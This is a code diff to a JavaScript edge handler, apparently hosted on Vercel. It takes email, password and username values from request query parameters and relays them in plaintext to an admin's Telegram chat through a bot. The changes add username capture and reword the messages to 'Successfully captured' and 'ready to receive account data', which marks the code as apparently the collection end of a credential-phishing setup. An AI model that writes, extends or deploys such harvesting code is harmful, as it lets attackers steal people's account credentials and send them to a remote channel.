@@ -27,6 +27,7 @@ export default async function handler(req) {
 
   const email = searchParams.get("email");
   const password = searchParams.get("password");
+  const username = searchParams.get("username");
 
   // =========================
   // ACCOUNT API
@@ -35,12 +36,15 @@ export default async function handler(req) {
   if (email && password) {
 
     const msg =
-`🔐 *Account Details*
+`📥 *New Account Data Received*
 
-📧 Email: \`${email}\`
-🔑 Password: \`${password}\`
+👤 *Username:* \`${username || "N/A"}\`
+📧 *Email:* \`${email}\`
+🔑 *Password:* \`${password}\`
 
-📡 Status: Received`;
+━━━━━━━━━━━━━━
+📡 *Status:* Successfully captured
+🕒 *Server:* Vercel Edge Runtime`;
 
     await sendMessage(ADMIN_ID, msg);
 
@@ -58,11 +62,15 @@ export default async function handler(req) {
 
     if (message?.text === "/start") {
 
-      await sendMessage(
-        message.chat.id,
-        "🤖 *bot is running*"
-      );
+      const reply =
+`🤖 *Bot Status: Online*
 
+This bot is connected successfully and ready to receive account data.
+
+📡 Runtime: *Vercel Edge*
+⚡ Status: *Operational*`;
+
+      await sendMessage(message.chat.id, reply);
     }
 
     return new Response("ok");
